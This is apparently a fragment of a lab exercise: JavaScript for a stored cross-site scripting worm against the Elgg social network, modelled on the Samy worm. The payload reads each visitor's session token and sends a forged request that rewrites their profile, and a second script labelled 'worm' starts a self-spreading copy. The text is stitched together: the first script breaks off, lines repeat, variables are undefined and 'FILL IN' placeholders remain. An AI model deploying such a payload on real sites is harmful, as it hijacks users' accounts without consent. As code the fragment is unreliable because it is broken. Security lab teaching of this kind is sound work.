<script type="text/javascript">
    window.onload = function () {
        //JavaScript code to access user name, user guid, Time Stamp __elgg_ts

        var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
        //Construct the content of your url.
        var aboutme = "Samy is my hero";
        var content = `${token}${ts}${userName}&description=<p>${aboutme}</p>&accesslevel[description]=2&accesslevel[briefdescription]=2&location=&accesslevel[location]=2&interests=&accesslevel[interests]=2&skills=&accesslevel[skills]=2&contactemail=&accesslevel[contactemail]=2&phone=&accesslevel[phone]=2&mobile=&accesslevel[mobile]=2&website=&accesslevel[website]=2&twitter=&accesslevel[twitter]=2&guid=${guid}`; //FILL IN

        if (elgg.session.user.guid != samyGuid) {
            //Create and send Ajax request to modify profile

<script type="text/javascript" id="worm">

        //FILL IN

        if (elgg.session.user.guid != samyGuid) {
            //Create and send Ajax request to modify profile

            Ajax.open("POST", sendurl, true);
